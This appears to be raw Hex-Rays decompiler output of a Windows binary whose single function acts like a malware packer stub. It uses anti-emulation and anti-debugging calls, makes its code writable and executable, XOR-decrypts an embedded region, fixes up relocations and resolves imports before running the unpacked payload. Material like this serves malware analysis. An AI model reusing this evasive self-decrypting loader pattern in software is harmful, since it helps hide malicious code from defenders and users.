/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// void __usercall __noreturn start(int a1@<edi>);
int nullsub_1(void); // weak
// BOOL __stdcall AreAnyAccessesGranted(DWORD GrantedAccess, DWORD DesiredAccess);
// BOOL __stdcall AddAce(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);

//-------------------------------------------------------------------------
// Data declarations

char byte_4014A0[] = { '—' }; // weak
int dword_402780[160] =
{
  -977082866,
  -1601390081,
  133126541,
  411519604,
  -511498588,
  -625358359,
  -1191526924,
  509296842,
  1374679581,
  -235875834,
  -1806398111,
  53567183,
  470044411,
  -467131644,
  -550384562,
  -1137198731,
  447759423,
  1431041734,
  -224145068,
  -1745514941,
  49831079,
  496914303,
  -355523976,
  -779697532,
  -1285442013,
  368593764,
  1525938468,
  -53682442,
  -1717272519,
  206131838,
  319308280,
  -347394819,
  -797261036,
  -1292847183,
  342772477,
  1541994507,
  -3612686,
  -1700691188,
  258822426,
  270549706,
  -390909975,
  -750665534,
  -1313622806,
  388975037,
  1490352980,
  -14623530,
  -1704950840,
  265638356,
  292635549,
  -372101492,
  -757481049,
  -1960135357,
  763781916,
  1646182895,
  -188295410,
  -1853847513,
  71064119,
  712603806,
  -759097981,
  -372835650,
  -1960145307,
  763786012,
  1646182907,
  -977082866,
  -1601390289,
  891841319,
  712603806,
  -759097981,
  -372835650,
  -1960145307,
  763786012,
  1646182907,
  -977082866,
  -1601390289,
  891841319,
  712603806,
  -759097981,
  -372835650,
  -1960145307,
  763786012,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
char byte_404000[4096] =
{
  '\x1C',
  's',
  '†',
  '-',
  'û',
  'Á',
  '\x1E',
  'b',
  '\x0E',
  'æ',
  'Â',
  'Å',
  '/',
  '¹',
  'Œ',
  ' ',
  '\'',
  'k',
  '(',
  '5',
  'ž',
  'x',
  'y',
  '*',
  'ƒ',
  '\x15',
  'Á',
  'Ò',
  '¾',
  'ú',
  'Æ',
  'é',
  'e',
  'Ž',
  '*',
  '‹',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb


//----- (00401000) --------------------------------------------------------
void __usercall __noreturn start(int a1@<edi>)
{
  int v1; // ebp
  BOOL (__stdcall *v2)(PACL, DWORD, DWORD, LPVOID, DWORD); // esi
  int v3; // ebx
  int v4; // ebx
  int v5; // ebx
  int v6; // ebx
  int v7; // ebx
  int v8; // ebx
  int v9; // ebx
  int v10; // ebx
  int v11; // ebx
  int v12; // ebx
  int v13; // ebx
  int v14; // ebx
  int v15; // ebx
  int v16; // ebx
  int v17; // ebx
  int v18; // ebx
  int v19; // ebx
  int v20; // ebx
  int v21; // ebx
  int v22; // ebx
  int v23; // ebx
  int v24; // ebx
  int v25; // ebx
  int v26; // ebx
  int v27; // ebx
  int v28; // ebx
  int v29; // ebx
  int v30; // ebx
  int v31; // ebx
  int v32; // ebx
  int v33; // ebx
  int v34; // ebx
  int v35; // ebx
  int v36; // ebx
  int v37; // ebx
  int v38; // ebx
  int v39; // ebx
  int v40; // ebx
  int v41; // ebx
  int v42; // ebx
  int v43; // ebx
  int v44; // ebx
  int v45; // ebx
  int v46; // ebx
  int v47; // ebx
  int v48; // ebx
  int v49; // ebx
  int v50; // ebx
  int v51; // ebx
  int v52; // ebx
  int v53; // ebx
  int v54; // ebx
  int v55; // ebx
  int v56; // ebx
  int v57; // ebx
  int v58; // ebx
  int v59; // ebx
  int v60; // ebx
  int v61; // ebx
  int v62; // ebx
  int v63; // ebx
  int v64; // ebx
  int v65; // ebx
  int v66; // ebx
  int v67; // ebx
  int v68; // ebx
  int v69; // ebx
  int v70; // ebx
  int v71; // ebx
  int v72; // ebx
  int v73; // ebx
  int v74; // ebx
  int v75; // ebx
  int v76; // ebx
  int v77; // ebx
  int v78; // ebx
  int v79; // ebx
  int v80; // ebx
  int v81; // ebx
  int v82; // ebx
  int v83; // edi
  unsigned int v84; // eax
  char *v85; // ebx
  char *v86; // esi
  int *v87; // edx
  _WORD *v88; // ecx
  char *v89; // eax
  char *v90; // esi
  HMODULE v91; // edx
  int v92; // ebp
  int v93; // eax
  char *v94; // ebp
  FARPROC *v95; // ebx
  FARPROC v96; // eax
  int v97; // ecx
  bool v98; // zf
  DWORD flOldProtect; // [esp+10h] [ebp-10h] BYREF
  char *v100; // [esp+14h] [ebp-Ch]
  unsigned int v101; // [esp+18h] [ebp-8h]
  char *v102; // [esp+1Ch] [ebp-4h]

  v1 = 0;
  v2 = AddAce;
  v3 = AddAce(0, 0, 0, 0, 0) + 36;
  v4 = AddAce(0, 0, 0, 0, 0) + v3;
  v5 = AddAce(0, 0, 0, 0, 0) + v4;
  v6 = AddAce(0, 0, 0, 0, 0) + v5;
  v7 = AddAce(0, 0, 0, 0, 0) + v6;
  v8 = AddAce(0, 0, 0, 0, 0) + v7;
  v9 = AddAce(0, 0, 0, 0, 0) + v8;
  v10 = AddAce(0, 0, 0, 0, 0) + v9;
  v11 = AddAce(0, 0, 0, 0, 0) + v10;
  v12 = AddAce(0, 0, 0, 0, 0) + v11;
  v13 = AddAce(0, 0, 0, 0, 0) + v12;
  v14 = AddAce(0, 0, 0, 0, 0) + v13;
  v15 = AddAce(0, 0, 0, 0, 0) + v14;
  v16 = AddAce(0, 0, 0, 0, 0) + v15;
  v17 = AddAce(0, 0, 0, 0, 0) + v16;
  v18 = AddAce(0, 0, 0, 0, 0) + v17;
  v19 = AddAce(0, 0, 0, 0, 0) + v18;
  v20 = AddAce(0, 0, 0, 0, 0) + v19;
  v21 = AddAce(0, 0, 0, 0, 0) + v20;
  v22 = AddAce(0, 0, 0, 0, 0) + v21;
  v23 = AddAce(0, 0, 0, 0, 0) + v22;
  v24 = AddAce(0, 0, 0, 0, 0) + v23;
  v25 = AddAce(0, 0, 0, 0, 0) + v24;
  v26 = AddAce(0, 0, 0, 0, 0) + v25;
  v27 = AddAce(0, 0, 0, 0, 0) + v26;
  v28 = AddAce(0, 0, 0, 0, 0) + v27;
  v29 = AddAce(0, 0, 0, 0, 0) + v28;
  v30 = AddAce(0, 0, 0, 0, 0) + v29;
  v31 = AddAce(0, 0, 0, 0, 0) + v30;
  v32 = AddAce(0, 0, 0, 0, 0) + v31;
  v33 = AddAce(0, 0, 0, 0, 0) + v32;
  v34 = AddAce(0, 0, 0, 0, 0) + v33;
  v35 = AddAce(0, 0, 0, 0, 0) + v34;
  v36 = AddAce(0, 0, 0, 0, 0) + v35;
  v37 = AddAce(0, 0, 0, 0, 0) + v36;
  v38 = AddAce(0, 0, 0, 0, 0) + v37;
  v39 = AddAce(0, 0, 0, 0, 0) + v38;
  v40 = AddAce(0, 0, 0, 0, 0) + v39;
  v41 = AddAce(0, 0, 0, 0, 0) + v40;
  v42 = AddAce(0, 0, 0, 0, 0) + v41;
  v43 = AddAce(0, 0, 0, 0, 0) + v42;
  v44 = AddAce(0, 0, 0, 0, 0) + v43;
  v45 = AddAce(0, 0, 0, 0, 0) + v44;
  v46 = AddAce(0, 0, 0, 0, 0) + v45;
  v47 = AddAce(0, 0, 0, 0, 0) + v46;
  v48 = AddAce(0, 0, 0, 0, 0) + v47;
  v49 = AddAce(0, 0, 0, 0, 0) + v48;
  v50 = AddAce(0, 0, 0, 0, 0) + v49;
  v51 = AddAce(0, 0, 0, 0, 0) + v50;
  v52 = AddAce(0, 0, 0, 0, 0) + v51;
  v53 = AddAce(0, 0, 0, 0, 0) + v52;
  v54 = AddAce(0, 0, 0, 0, 0) + v53;
  v55 = AddAce(0, 0, 0, 0, 0) + v54;
  v56 = AddAce(0, 0, 0, 0, 0) + v55;
  v57 = AddAce(0, 0, 0, 0, 0) + v56;
  v58 = AddAce(0, 0, 0, 0, 0) + v57;
  v59 = AddAce(0, 0, 0, 0, 0) + v58;
  v60 = AddAce(0, 0, 0, 0, 0) + v59;
  v61 = AddAce(0, 0, 0, 0, 0) + v60;
  v62 = AddAce(0, 0, 0, 0, 0) + v61;
  v63 = AddAce(0, 0, 0, 0, 0) + v62;
  v64 = AddAce(0, 0, 0, 0, 0) + v63;
  v65 = AddAce(0, 0, 0, 0, 0) + v64;
  v66 = AddAce(0, 0, 0, 0, 0) + v65;
  v67 = AddAce(0, 0, 0, 0, 0) + v66;
  v68 = AddAce(0, 0, 0, 0, 0) + v67;
  v69 = AddAce(0, 0, 0, 0, 0) + v68;
  v70 = AddAce(0, 0, 0, 0, 0) + v69;
  v71 = AddAce(0, 0, 0, 0, 0) + v70;
  v72 = AddAce(0, 0, 0, 0, 0) + v71;
  v73 = AddAce(0, 0, 0, 0, 0) + v72;
  v74 = AddAce(0, 0, 0, 0, 0) + v73;
  v75 = AddAce(0, 0, 0, 0, 0) + v74;
  v76 = AddAce(0, 0, 0, 0, 0) + v75;
  v77 = AddAce(0, 0, 0, 0, 0) + v76;
  v78 = AddAce(0, 0, 0, 0, 0) + v77;
  v79 = AddAce(0, 0, 0, 0, 0) + v78;
  v80 = AddAce(0, 0, 0, 0, 0) + v79;
  v81 = AddAce(0, 0, 0, 0, 0) + v80;
  v82 = AddAce(0, 0, 0, 0, 0) + v81;
  if ( !AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v82 -= 34;
  CloseHandle((HANDLE)0x59);
  v83 = VirtualProtect(start, 0x3000u, 0x40u, &flOldProtect) + 8 * a1;
  v84 = 0;
  while ( 1 )
  {
    if ( v1 == v82 )
      v1 = 0;
    byte_4014A0[v84] ^= byte_404000[v1];
    v2 = (BOOL (__stdcall *)(PACL, DWORD, DWORD, LPVOID, DWORD))(2 * (_DWORD)v2);
    ++v84;
    ++v1;
    if ( v84 >= 0x1420 )
    {
      v85 = &byte_4014A0[-640];
      v86 = 0;
      v87 = dword_402780;
      v100 = &byte_4014A0[-640];
      v102 = 0;
      while ( 1 )
      {
        v88 = v87 + 2;
        if ( (unsigned int)(v87[1] - 8) >> 1 )
        {
          v101 = (unsigned int)(v87[1] - 8) >> 1;
          do
          {
            v83 = (int)&v85[4 * v83];
            if ( (*v88 & 0xF000) == 12288 )
            {
              v86 += v83;
              v89 = &v85[*v87 + (*v88 & 0xFFF)];
              *(_DWORD *)v89 += &byte_4014A0[-268436096];
            }
            ++v88;
            --v101;
          }
          while ( v101 );
          v86 = v102;
        }
        v86 += v87[1];
        v102 = v86;
        v83 = (int)&v85[4 * v83];
        v87 = (int *)((char *)v87 + v87[1]);
        if ( (unsigned int)v86 >= 0xE4 )
        {
          v90 = &byte_4014A0[2780];
          v102 = &byte_4014A0[2780];
          if ( *(_DWORD *)&byte_4014A0[2796] )
          {
            do
            {
              v91 = LoadLibraryA(&v85[*((_DWORD *)v90 + 3)]);
              v101 = (unsigned int)v91;
              if ( v91 )
              {
                v92 = *(_DWORD *)v90;
                if ( !*(_DWORD *)v90 )
                  v92 = *((_DWORD *)v90 + 4);
                v93 = *(_DWORD *)&v85[v92];
                v94 = &v85[v92];
                v95 = (FARPROC *)&v100[*((_DWORD *)v90 + 4)];
                if ( v93 )
                {
                  while ( 1 )
                  {
                    if ( v93 >= 0 )
                    {
                      v96 = GetProcAddress(v91, &v100[v93 + 2]);
                    }
                    else
                    {
                      v96 = GetProcAddress(v91, (LPCSTR)*(unsigned __int16 *)v94);
                      v90 += v97;
                    }
                    *v95 = v96;
                    v94 += 4;
                    v83 = (int)&v90[4 * v83];
                    v93 = *(_DWORD *)v94;
                    ++v95;
                    if ( !*(_DWORD *)v94 )
                      break;
                    v91 = (HMODULE)v101;
                  }
                  v90 = v102;
                }
                v85 = v100;
              }
              v90 += 20;
              v98 = *((_DWORD *)v90 + 4) == 0;
              v102 = v90;
            }
            while ( !v98 );
          }
          nullsub_1();
          ExitProcess(0);
        }
      }
    }
  }
}
// 401416: variable 'v97' is possibly undefined
// 401C70: using guessed type int nullsub_1(void);
// 402780: using guessed type int dword_402780[160];

// nfuncs=2 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
